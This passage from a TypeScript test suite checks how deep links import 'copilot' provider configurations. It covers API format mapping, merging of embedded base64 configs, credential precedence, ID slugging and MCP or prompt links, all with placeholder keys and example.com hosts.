      buildFromLink("copilot", { apiFormat: "openai_responses" })
        .settingsConfig,
    ).toMatchObject({ provider: { wireApi: "responses" } });
    const anthropic = buildFromLink("copilot", { apiFormat: "anthropic" })
      .settingsConfig as { provider: Record<string, string> };
    expect(anthropic.provider.type).toBe("anthropic");
    expect(anthropic.provider.wireApi).toBeUndefined();
    expect(() =>
      parseDeepLinkUrl(providerLink("copilot", { apiFormat: "gemini_native" })),
    ).toThrow();
  });

  it("Copilot 不调 /models：链接和 config 都没有模型时拒绝", () => {
    const url = new URL(providerLink("copilot"));
    url.searchParams.delete("model");
    expect(() =>
      buildProviderFromRequest(parseDeepLinkUrl(url.toString())),
    ).toThrow(/model/);
  });

  it("旧版 env 形状的 config 只补地址、Key 和模型，URL 参数优先", async () => {
    const url = new URL(providerLink("copilot"));
    url.searchParams.delete("apiKey");
    url.searchParams.delete("model");
    url.searchParams.set(
      "config",
      encodeBase64Utf8(
        JSON.stringify({
          env: {
            COPILOT_PROVIDER_BASE_URL: "https://config.example.com/v1",
            COPILOT_PROVIDER_API_KEY: "sk-from-config",
            COPILOT_MODEL: "config-model",
            COPILOT_PROVIDER_HEADERS: "X-Extra: 1",
          },
        }),
      ),
    );
    const merged = await mergeDeepLinkConfig(parseDeepLinkUrl(url.toString()));
    expect(merged.endpoint).toBe("https://api.example.com/v1");
    expect(merged.apiKey).toBe("sk-from-config");
    expect(merged.model).toBe("config-model");
    expect(buildProviderFromRequest(merged).settingsConfig).toEqual({
      provider: {
        type: "openai",
        wireApi: "completions",
        baseUrl: "https://api.example.com/v1",
        apiKey: "sk-from-config",
      },
      models: [{ id: "config-model" }],
    });
  });

  it("原生 config：bearerToken 也算凭据，链接模型排第一、其余模型保留", async () => {
    const url = new URL(providerLink("copilot"));
    url.searchParams.delete("apiKey");
    url.searchParams.set(
      "config",
      encodeBase64Utf8(
        JSON.stringify({
          provider: {
            baseUrl: "https://config.example.com/v1",
            bearerToken: "token-from-config",
          },
          models: [{ id: "a" }, { id: "example-model" }, { id: "b" }],
        }),
      ),
    );
    const merged = await mergeDeepLinkConfig(parseDeepLinkUrl(url.toString()));
    // bearerToken 不填进 apiKey，构建卡片时从内嵌 config 取
    expect(merged.apiKey).toBeUndefined();
    expect(buildProviderFromRequest(merged).settingsConfig).toEqual({
      provider: {
        type: "openai",
        wireApi: "completions",
        baseUrl: "https://api.example.com/v1",
        bearerToken: "token-from-config",
      },
      models: [{ id: "example-model" }, { id: "a" }, { id: "b" }],
    });

    // URL 的 apiKey 覆盖内嵌的 bearerToken
    url.searchParams.set("apiKey", "sk-url");
    const withKey = await mergeDeepLinkConfig(parseDeepLinkUrl(url.toString()));
    const provider = (
      buildProviderFromRequest(withKey).settingsConfig as {
        provider: Record<string, string>;
      }
    ).provider;
    expect(provider.apiKey).toBe("sk-url");
    expect(provider.bearerToken).toBeUndefined();
  });

  it("没有凭据、模型 ID 不是字面量、凭据带变量引用时拒绝", async () => {
    const noCredential = new URL(providerLink("copilot"));
    noCredential.searchParams.delete("apiKey");
    await expect(
      importFromDeepLink(parseDeepLinkUrl(noCredential.toString())),
    ).rejects.toThrow(/API Key|bearerToken/);

    const badModel = new URL(providerLink("copilot"));
    badModel.searchParams.set(
      "config",
      encodeBase64Utf8(
        JSON.stringify({
          provider: { baseUrl: "https://x.example.com/v1" },
          models: [{ id: "${MODEL}" }],
        }),
      ),
    );
    await expect(
      mergeDeepLinkConfig(parseDeepLinkUrl(badModel.toString())),
    ).rejects.toThrow();

    expect(() =>
      parseDeepLinkUrl(providerLink("copilot", { apiKey: "${TOKEN}" })),
    ).toThrow();
  });

  it("卡片 id 取名字的 slug，撞了已有的就加序号；默认马上添加进 providers.json", async () => {
    providersApiMock.getAll.mockResolvedValueOnce({
      "my-relay": {},
      "my-relay-2": {},
    });
    const request = parseDeepLinkUrl(
      providerLink("copilot", { name: "My Relay" }),
    );
    await importFromDeepLink(request);
    expect(providersApiMock.getAll).toHaveBeenCalledWith("copilot");
    expect(providersApiMock.add).toHaveBeenCalledWith(
      expect.objectContaining({ id: "my-relay-3" }),
      "copilot",
      true,
    );
    expect(providersApiMock.switch).not.toHaveBeenCalled();

    // 关掉开关：只存进列表，不写 providers.json
    providersApiMock.add.mockClear();
    await importFromDeepLink({ ...request, enabled: false });
    expect(providersApiMock.add).toHaveBeenCalledWith(
      expect.anything(),
      "copilot",
      false,
    );
  });

  it("提示词与 MCP 链接接受 copilot", async () => {
    const prompt = parseDeepLinkUrl(
      `ccswitch://v1/import?resource=prompt&app=copilot&name=P&content=${encodeBase64Utf8("hi")}`,
    );
    expect(prompt.app).toBe("copilot");
    const config = encodeBase64Utf8('{"mcpServers":{"a":{"command":"x"}}}');
    await importFromDeepLink(
      parseDeepLinkUrl(
        `ccswitch://v1/import?resource=mcp&apps=copilot&config=${config}`,
      ),
    );
    const saved = mcpApiMock.upsertUnifiedServer.mock.calls.at(-1)?.[0] as {
      apps: Record<string, boolean>;
    };
    expect(saved.apps).toMatchObject({ copilot: true, claude: false });
  });
});
